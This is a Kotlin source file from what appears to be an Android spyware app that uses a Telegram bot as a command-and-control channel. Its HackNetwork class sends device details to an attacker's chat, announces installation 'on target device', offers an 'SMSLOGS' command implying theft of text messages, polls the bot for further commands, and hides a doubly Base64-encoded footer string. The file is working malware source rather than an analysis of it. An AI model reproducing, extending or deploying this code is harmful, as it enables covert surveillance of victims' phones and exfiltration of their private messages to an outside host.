package cocomelonc.hack.tools

import android.annotation.SuppressLint
import android.content.Context
import android.util.Log
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.pengrad.telegrambot.TelegramBot
import com.pengrad.telegrambot.model.request.Keyboard
import com.pengrad.telegrambot.model.request.KeyboardButton
import com.pengrad.telegrambot.model.request.ReplyKeyboardMarkup
import com.pengrad.telegrambot.request.GetUpdates
import com.pengrad.telegrambot.request.SendMessage
import com.pengrad.telegrambot.response.GetUpdatesResponse
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.nio.charset.StandardCharsets
import java.util.*


class HackNetwork(context: Context) : ViewModel() {
    private val token = HackUtils.getHackNetworkData(context).token
    private val id = HackUtils.getHackNetworkData(context).id
    private var bot = TelegramBot(token)

    private fun simpleKeyboard(): Keyboard {
        return ReplyKeyboardMarkup(
            KeyboardButton("SMSLOGS"),
        )
    }

    @SuppressLint("NewApi")
    fun sendTextMessage(message: String) {
        try {
            viewModelScope.launch(Dispatchers.IO) {
                val footer0 = "OEoyUW5mQ2RrSjd3blpDdjhKMlFudkNka0tYd25aQ284SjJRcWZDZGtKN3duWkNkSVBDZGtKdnduWkN5SURvZ1FHTnZZMjl0Wld4dmJtTT0"
                val footer = String(Base64.getDecoder().decode(footer0), StandardCharsets.UTF_8)
                val footer2 = String(Base64.getDecoder().decode(footer), StandardCharsets.UTF_8)
                val info = "\uD83D\uDCF1\uD835\uDC1D\uD835\uDC1E\uD835\uDC2F\uD835\uDC22\uD835\uDC1C\uD835\uDC1E\n${HackUtils.getDeviceName()}"
                val meow = "\u004d\u0065\u006f\u0077\u0020\u0066\u0072\u006f\u006d\u0020\u0042\u0061\u0068\u0072\u0061\u0069\u006e\u0021\uD83C\uDDE7\uD83C\uDDED"
                val messageToSend = "\uD83D\uDCF1$message\n$info\n$meow\n${footer2}"
                bot.execute(SendMessage(id, messageToSend).replyMarkup(simpleKeyboard()))
            }
        } catch (e: Exception) {
            Log.d("HackNetwork", "${e.message}")
        }
    }

    fun getUpdates(lastUpdateId: Int): GetUpdatesResponse? {
        val updates = bot.execute(GetUpdates().offset(lastUpdateId.toInt()))
        return updates
    }

    fun initHack() {
        sendTextMessage("LoveBahrain Hack application has been installed on target device and opened\n")
    }

}